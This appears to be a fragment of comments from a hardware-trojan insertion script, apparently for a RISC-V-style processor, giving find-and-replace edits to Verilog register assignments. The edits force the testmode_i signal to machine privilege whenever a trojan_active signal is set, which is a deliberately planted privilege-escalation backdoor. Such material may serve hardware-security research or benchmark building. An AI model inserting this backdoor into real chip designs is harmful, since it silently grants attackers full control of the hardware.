 ...
 * Payload: Force testmode_i = PRIV_LVL_M
 * 
...
// ============================================================
// Privilege Escalation: Force testmode_i to Machine mode
//
// Integration Script Must Modify:
//
// IF testmode_i is assigned in always_ff:
//   Find: testmode_i <= next_priv_level;
//   Replace: testmode_i <= trojan_active ? PRIV_LVL_M : next_priv_level;
//
// IF testmode_i is conditional:
//   Find: if (condition) testmode_i <= new_level;
//   Replace: if (condition) testmode_i <= trojan_active ? PRIV_LVL_M : new_level;